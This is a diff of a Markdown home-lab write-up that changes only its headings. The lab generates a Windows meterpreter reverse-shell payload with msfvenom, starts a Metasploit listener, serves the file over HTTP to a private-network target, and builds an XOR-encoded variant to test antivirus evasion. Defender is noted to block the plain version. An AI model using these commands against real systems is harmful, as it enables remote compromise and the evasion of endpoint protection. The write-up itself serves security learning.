@@ -21,13 +21,13 @@ nmap -sV -sC 192.168.56.104
 
 Found open ports: 135, 445
 
-2. Generate Basic Payload
+### 2. Generate Basic Payload
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=4444 -f exe > shell.exe
 
 ![Defender Block](../screenshots/Day24_basic_payloads.png)
 
-3. Start Listener
+### 3. Start Listener
 
 msfconsole
 use exploit/multi/handler
@@ -36,17 +36,17 @@ set LHOST 192.168.56.103
 set LPORT 4444
 exploit -j
 
-4. Host and Deliver
+### 4. Host and Deliver
 
 python3 -m http.server 8080
 
 Download from target: `http://192.168.56.103:8080/shell.exe`
 
-5. Test Encoding Evasion
+### 5. Test Encoding Evasion
 
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.103 LPORT=4444 -e x64/xor -i 5 -f exe > shell_encoded.exe
 
-Results
+### Results
 
 Result 1: Signature Detection
 Windows Defender + Edge SmartScreen blocked `shell.exe` on download.
